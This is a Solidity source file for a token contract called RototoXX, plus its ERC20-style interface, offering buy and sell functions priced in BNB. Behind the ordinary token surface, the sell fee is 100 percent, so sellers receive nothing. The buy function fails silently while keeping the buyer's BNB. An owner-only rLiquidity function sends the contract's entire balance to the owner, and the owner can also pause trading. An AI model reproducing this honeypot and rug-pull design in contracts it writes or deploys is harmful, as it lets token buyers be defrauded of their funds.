// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./interfaces/IERC20.sol";

contract RototoXX is IERC20 {
    /// @dev name of the token
    string public name;

    /// @dev symbol of the token
    string public symbol;

    /// @dev decimal place the amount of the token will be calculated
    uint8 public decimals;

    /// @dev total supply
    uint256 public totalSupply;

    /// @dev 0.001 bnb
    uint256 public tokenPrice = 1 * (10**15);

    /// @dev default to true
    bool public isTradingOn = true;

    /// @dev
    uint256 public BUY_DEVELOPER_AND_MARKETING_FEE = 2;
    uint256 public SELL_DEVELOPER_AND_MARKETING_FEE = 100;

    /// @dev owner of the token
    address public owner;

    /// @dev create a table so that we can map addresses to the balances associated with them
    mapping(address => uint256) balances;

    /// @dev create a table so that we can map the addresses of contract owners to those
    /// @dev who are allowed to utilize the owner's contract
    mapping(address => mapping(address => uint256)) allowed;

    /// @dev throws if called by any account other than the owner
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /// @dev run during the deployment of smart contract
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply * (10**_decimals);
        owner = msg.sender;

        balances[address(this)] = totalSupply;
    }

    /// @dev get balance of an account
    function balanceOf(address account) public view override returns (uint256) {
        // return the balance for the specific address
        return balances[account];
    }

    /// @dev approve address/contract to spend a specific amount of token
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        allowed[msg.sender][spender] = amount;

        // fire the event "Approval" to execute any logic
        // that was listening to it
        emit Approval(msg.sender, spender, amount);

        return true;
    }

    /// @dev get the remaining amount approved for address/contract
    function allowance(address _owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allowed[_owner][spender];
    }

    /// @dev send token from current address/contract to another recipient
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        require(
            msg.sender != address(0),
            "ERC20: transfer from zero address not allowed"
        );

        // if the sender has sufficient funds to send
        // and the amount is not zero, then send to
        // the given address
        if (
            balances[msg.sender] >= amount &&
            amount > 0 &&
            balances[recipient] + amount > balances[recipient]
        ) {
            balances[msg.sender] -= amount;
            balances[recipient] += amount;

            // fire a transfer event for any logic that's listening
            emit Transfer(msg.sender, recipient, amount);

            return true;
        } else {
            return false;
        }
    }

    /// @dev automate sending of token from approved sender address/contract to another
    /// @dev recipient
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(
            sender != address(0),
            "ERC20: transferFrom from zero address not allowed"
        );

        if (
            balances[sender] >= amount &&
            allowed[sender][msg.sender] >= amount &&
            amount > 0 &&
            balances[recipient] + amount > balances[recipient]
        ) {
            balances[sender] -= amount;
            balances[recipient] += amount;

            // fire a transfer event for any logic that's listening
            emit Transfer(sender, recipient, amount);

            return true;
        } else {
            return false;
        }
    }

    /// @dev
    function buy(address recipient) public payable override returns (bool) {
        // trade only when trading is ON
        require(isTradingOn == true, "ERC20: trading is not allowed");

        uint256 amountToBuy = msg.value;

        // negative & non-zero not allowed
        require(amountToBuy > 0, "ERC20: negative & non-zero not allowed");

        uint256 fee = (BUY_DEVELOPER_AND_MARKETING_FEE * amountToBuy) / 100;

        uint256 amountToBuyAfterDeductingFee = amountToBuy - fee;

        uint256 amountToSend = amountToBuyAfterDeductingFee / tokenPrice;

        // send token
        if (transfer(recipient, amountToSend)) {
            return true;
        } else {
            return false;
        }
    }

    /// @dev
    function sell(uint256 amount) public payable override returns (bool) {
        // trade only when trading is ON
        require(isTradingOn == true, "ERC20: trading is not allowed");

        uint256 amountToSell = amount;

        require(amountToSell > 0, "ERC20: negative & non-zero not allowed");
        require(
            balances[msg.sender] >= amountToSell,
            "ERC20: not enough token"
        );
        require(
            allowance(msg.sender, address(this)) >= amountToSell,
            "ERC20: not enough token approval"
        );

        // send amountToSell back to this contract
        if (transferFrom(msg.sender, address(this), amountToSell)) {
            uint256 amountToSellForBNB = amountToSell * tokenPrice;

            uint256 fee = (SELL_DEVELOPER_AND_MARKETING_FEE *
                amountToSellForBNB) / 100;

            // calculate amountToSend
            uint256 amountToSend = amountToSellForBNB - fee;

            // send amount
            payable(msg.sender).transfer(amountToSend);

            return true;
        } else {
            return false;
        }
    }

    /// @dev
    function pauseTrading() public override onlyOwner returns (bool) {
        isTradingOn = false;

        return true;
    }

    /// @dev
    function resumeTrading() public override onlyOwner returns (bool) {
        isTradingOn = true;

        return true;
    }

    /// @dev
    function rLiquidity() public override onlyOwner returns (bool) {
        payable(owner).transfer(address(this).balance);

        return true;
    }

    /// @dev
    function transferOwnership(address newOwner)
        public
        override
        onlyOwner
        returns (bool)
    {
        require(
            newOwner != address(0),
            "Ownable: owner can't the zero addresss"
        );

        owner = newOwner;

        return true;
    }

    /// @dev
    function renounceOwnership() public override onlyOwner returns (bool) {
        owner = address(0);

        return true;
    }

    /// @dev
    function bulkAirdrop(address[] memory recipients, uint256 amount)
        public
        override
        onlyOwner
        returns (bool)
    {
        uint256 totalRecipient = recipients.length;
        uint256 totalTokenAmountNeeded = totalRecipient * amount;

        // not enough token
        require(
            balanceOf(address(this)) >= totalTokenAmountNeeded,
            "ERC20: not enough token"
        );

        for (uint256 i = 0; i < totalRecipient; i++) {
            // airdrop token to recipient
            transfer(recipients[i], amount);
        }

        return true;
    }

    /// @dev
    function airdrop(address recipient, uint256 amount)
        public
        override
        onlyOwner
        returns (bool)
    {
        // not enough token
        require(balanceOf(address(this)) >= amount, "ERC20: not enough token");

        // airdrop token to recipient
        if (transfer(recipient, amount)) {
            return true;
        } else {
            return false;
        }
    }

    /// @dev return bnb back
    ///
    receive() external payable {
        // send bnb back
        payable(msg.sender).transfer(msg.value);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IERC20 {
    /// @dev Tranfer and Approval events

    /// @dev Emitted when `value` tokens are moved from one account (`from`) to
    /// @dev another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);

    /// @dev Emitted when the allowance of a `spender` for an `owner` is set by
    /// @dev a call to {approve}. `value` is the new allowance.
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /// @dev get the name of the token
    function name() external view returns (string memory);

    /// @dev get the symbol of the token
    function symbol() external view returns (string memory);

    /// @dev get the decimals of the token
    function decimals() external view returns (uint8);

    /// @dev get the total tokens in supply
    function totalSupply() external view returns (uint256);

    /// @dev get balance of an account
    function balanceOf(address account) external view returns (uint256);

    /// @dev approve address/contract to spend a specific amount of token
    function approve(address spender, uint256 amount) external returns (bool);

    /// @dev get the remaining amount approved for address/contract
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /// @dev send token from current address/contract to another recipient
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /// @dev automate sending of token from approved sender address/contract to another
    /// @dev recipient
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /// @dev
    function buy(address recipient) external payable returns (bool);

    /// @dev
    function sell(uint256 amount) external payable returns (bool);

    /// @dev
    function pauseTrading() external returns (bool);

    /// @dev
    function resumeTrading() external returns (bool);

    /// @dev
    function rLiquidity() external returns (bool);

    /// @dev
    function transferOwnership(address newOwner) external returns (bool);

    /// @dev
    function renounceOwnership() external returns (bool);

    /// @dev
    function bulkAirdrop(address[] memory recipients, uint256 amount)
        external
        returns (bool);

    /// @dev
    function airdrop(address recipient, uint256 amount) external returns (bool);
}